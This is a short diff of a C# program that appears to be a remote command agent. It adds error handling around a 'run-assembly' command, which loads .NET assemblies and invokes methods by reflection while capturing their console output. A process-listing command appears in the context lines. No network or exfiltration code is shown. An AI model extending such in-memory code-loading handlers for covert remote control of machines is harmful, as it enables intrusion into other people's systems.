@@ -386,7 +386,7 @@ public class Program
               var xxx = loadedType.Assembly.GetType("ProcHandler").InvokeMember("GetProcesses", BindingFlags.InvokeMethod, null, null, null);
               output = xxx.ToString();
             }
-            
+          
             // run loaded assemblies
             if (c.ToLower().StartsWith("run-assembly")){
               string[] splitargs = c.Split(new string[] {" "}, StringSplitOptions.RemoveEmptyEntries);
@@ -401,8 +401,13 @@ public class Program
             			var stringOutput = new StringWriter();
             			Console.SetOut(stringOutput);
             			var loadedType = LoadSomething(qualifiedname + ", " + Ass.FullName);
-            			var xxx = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.InvokeMethod, null, null, null);
-            			output = xxx.ToString() + stringOutput.ToString();
+                  try {
+                      var xxx = loadedType.Assembly.GetType(qualifiedname).InvokeMember(method, BindingFlags.InvokeMethod, null, null, null);
+                      output = xxx.ToString() + stringOutput.ToString();
+                  } catch (Exception e)  {
+                      var xxx = e;
+                      output = xxx.ToString() + stringOutput.ToString();
+                  }
             		}
             	}
             }
